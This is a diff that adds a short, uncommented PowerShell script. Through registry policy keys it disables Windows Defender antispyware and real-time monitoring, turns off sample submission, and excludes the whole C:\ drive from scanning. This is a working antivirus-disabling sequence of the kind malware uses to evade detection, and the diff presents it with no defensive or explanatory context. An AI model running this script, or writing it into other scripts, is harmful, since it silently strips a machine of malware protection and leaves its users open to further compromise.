@@ -1,0 +1,9 @@
+Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWORD -Value 1 -Force
+
+New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection" -Type KEY -Force
+
+Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Type DWORD -Value 1 -Force
+
+Set-MpPreference -SubmitSamplesConsent 0
+
+Add-MpPreference -ExclusionPath "C:\"
